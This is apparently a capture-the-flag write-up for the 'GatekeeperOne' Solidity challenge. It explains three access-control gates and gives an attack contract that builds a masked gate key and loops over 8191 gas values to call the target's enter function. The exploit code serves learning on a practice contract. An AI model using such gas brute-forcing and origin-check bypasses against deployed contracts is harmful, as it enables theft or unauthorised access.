We need to register as an entrant to pass this level.

To register as an entrant we need to pass a function with 3 modifiers.

````solidity
    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
These modifiers are being called the three gates.

GateOne
```solidity
    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }
````

We can call the function through another contract to pass this gate.

GateTwo

```solidity
    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }
```

This seems like a tough one until we realise we can do multiple tries(i.e. 8191 tries) to pass this gate

GateThree

```solidity
    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }
```

This gate can passed by reducing our address to a value known here as `gatekey`
The calculation i have given below

```solidity
    function attack() public{
        uint256 gasAmount = 802928;
        bytes8 gateKey = bytes8(uint64(uint160(msg.sender)));
        gateKey = bytes8(0xFFFFFFFF0000FFFF) & gateKey;
        for(uint i=0;i < 8191;i++){
            (bool success,) = address(gateKeeperOne).call{gas: gasAmount+i}(abi.encodeWithSignature("enter(bytes8)", gateKey));
        }
    }
```
